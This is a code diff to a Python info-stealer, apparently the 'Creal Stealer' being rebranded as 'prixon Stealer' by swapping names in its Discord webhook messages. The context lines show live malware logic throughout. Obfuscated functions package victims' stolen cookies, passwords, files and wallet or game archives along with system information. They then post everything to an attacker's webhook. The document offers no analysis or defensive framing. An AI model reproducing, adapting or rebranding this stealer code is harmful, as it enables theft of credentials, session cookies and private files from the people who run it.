@@ -415,7 +415,7 @@ def upl05dT4k31(t0k3n, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "Creal Stealer",
+                "text": "prixon Stealer",
                 "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
                 },
             "thumbnail": {
@@ -424,7 +424,7 @@ def upl05dT4k31(t0k3n, path):
             }
         ],
         "avatar_url": "https://i.imgur.com/S0Zqp4R.jpg",
-        "username": "Creal Stealer",
+        "username": "prixon Stealer",
         "attachments": []
         }
     L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
@@ -452,23 +452,23 @@ def upload(name, link):
             "content": f"{globalInfo()}",
             "embeds": [
                 {
-                    "title": "Creal | Cookies Stealer",
+                    "title": "prixon| Cookies Stealer",
                     "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
                     "color": 2895667,
                     "footer": {
-                        "text": "Creal Stealer",
+                        "text": "prixon Stealer",
                         "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
                     }
                 }
             ],
-            "username": "Creal Stealer",
+            "username": "prixon Stealer",
             "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
             "attachments": []
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
         return
 
-    if name == "crpassw":
+    if name == "passwords":
         ra = ' | '.join(da for da in paswWords)
         if len(ra) > 1000: 
             rrr = R4f0rm3t(str(paswWords))
@@ -478,16 +478,16 @@ def upload(name, link):
             "content": f"{globalInfo()}",
             "embeds": [
                 {
-                    "title": "Creal | Password Stealer",
+                    "title": "prixon | Password Stealer",
                     "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
                     "color": 2895667,
                     "footer": {
-                        "text": "Creal Stealer",
+                        "text": "prixon Stealer",
                         "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
                     }
                 }
             ],
-            "username": "Creal",
+            "username": "prixon",
             "avatar_url": "https://i.imgur.com/S0Zqp4R.jpg",
             "attachments": []
             }
@@ -507,15 +507,15 @@ def upload(name, link):
                     }
                 ],
                 "author": {
-                    "name": "Creal | File Stealer"
+                    "name": "prixon | File Stealer"
                 },
                 "footer": {
-                    "text": "Creal Stealer",
+                    "text": "prixon Stealer",
                     "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
                 }
                 }
             ],
-            "username": "Creal Stealer",
+            "username": "prixon Stealer",
             "avatar_url": "https://i.imgur.com/S0Zqp4R.jpg",
             "attachments": []
             }
@@ -706,16 +706,16 @@ def GatherZips(paths1, paths2, paths3):
         "content": globalInfo(),
         "embeds": [
             {
-            "title": "Creal Zips",
+            "title": "prixon Zips",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 2895667,
             "footer": {
-                "text": "Creal Stealer",
+                "text": "prixon Stealer",
                 "icon_url": "https://i.imgur.com/S0Zqp4R.jpg"
             }
             }
         ],
-        "username": "Creal Stealer",
+        "username": "prixon Stealer",
         "avatar_url": "https://i.imgur.com/S0Zqp4R.jpg",
         "attachments": []
     }
